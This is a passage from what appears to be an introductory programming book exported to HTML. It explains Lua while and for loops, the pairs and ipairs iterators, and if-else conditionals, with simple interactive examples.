</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >loop is especially powerful because it allows you to loop over data structures like an array very easily. It makes for more readable code and fewer off-by-one errors when dealing with array lengths. The generic </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >loop calls the iterator function for every iteration. There are iterator functions available for most data structures. The iterator functions you will use most are </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >pairs </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ipairs</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Try the following in the Lua shell to get an idea of how loops work. Notice we don&#8217;t have the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.4500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >symbol from the interactive shell to make this code easier to copy and paste.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.3000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >i=1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:374.2000pt;margin-left:22.3500pt;text-indent:-14.4000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >while i&#60;=10 do print(i)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:410.2000pt;margin-left:8.0000pt;text-indent:14.3500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >i = i+1 end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:374.2000pt;margin-left:22.3500pt;text-indent:-14.4000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for y=21,30 do print(y)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >x= {11,12,13,14,15,16,17,18,19,20}</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:266.2000pt;margin-left:22.3500pt;text-indent:-14.4000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for key,value in ipairs(x) do print(value)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >x= {11,12,13,14,15,16,17,18,19,20}</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:273.4000pt;margin-left:22.3500pt;text-indent:-14.4000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for key,value in pairs(x) do print(value)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:9.0500pt;" ><a name="_bookmark614" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The first loop (a numeric </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >loop) example is a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >while </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >loop that says while the variable </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >i </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is less than or equal to the number 10, print the value of the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >i </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >variable and then increment it by one. You should see the numbers 1 through 10 printed on the screen. The next loop is a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >loop that sets the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >y</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >variable to the number 21. The loop runs until the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >y </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >variable, which is being incremented, reaches 30. You can change the step of a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >loop&#8212;that is, how much you increment your counter variable (</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >y </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >in this example)&#8212;by adding another number to the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >loop line. For example, to make the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >loop increment by two, change</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section327" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >the first line of the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >loop to </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for y=21,30,2 do</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. Now, for </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >pairs </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ipairs</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, do you notice anything interesting? They seem to output the same thing. Remember how we mentioned that tables can act like both an array/list and a hash/dictionary? While it is slightly subtler, the only thing you really need to remember is that </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ipairs </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >will work over a table that is acting like an array, and </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >pairs </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >is for tables that are acting like a dictionary. While </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >pairs </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >can be used against arrays, </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ipairs </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >cannot be used over tables, because it is looking only for number keys.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:12.0500pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:22.3500pt;text-indent:-14.3500pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >t_table = {foo = "bar", bar = "baz", baz =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.0500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"biz"}</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:22.3500pt;text-indent:-14.3500pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for key,value in ipairs(t_table)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.4000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >do</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62; print(key .. " " .. value)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62; end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-bottom:0.0000pt;margin-left:22.3500pt;text-indent:-14.3500pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for key,value in pairs(t_table)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.3500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >do</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62; print(key .. " " .. value)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;&#62; end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  align=justify  style="margin-top:0.0000pt;margin-right:425.5000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:justify;text-justify:inter-ideograph;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >baz biz bar baz foo bar</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The previous example is another generic </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >loop. Instead of cycling through numbers, the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >loop is working through the keys and values.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:14.9500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Conditionals</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;margin-right:11.1500pt;" ><a name="_bookmark615" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A big part of programming is controlling what code runs when a certain condition is met. To control the flow of your code, you can use conditionals. In Lua, this can only be done with </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >statements. The following snippet is a simple example of how you can use </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if-else </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >statements to control execution of your code:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.4000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if(1==1) then -- this statement is obviously true since 1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- does equal 1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:207.6000pt;margin-left:8.0000pt;text-indent:14.3500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >print("yes, it is true that 1=1") end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if (1==2) then -- this statement is false, since 1 does not</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- equal 2</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:178.7000pt;margin-left:8.0000pt;text-indent:14.3500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >print("it is not true that 1 equals 2") else</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:22.3500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >print("second if is false") --(this will occur since 1 is</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- not equal to 2</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
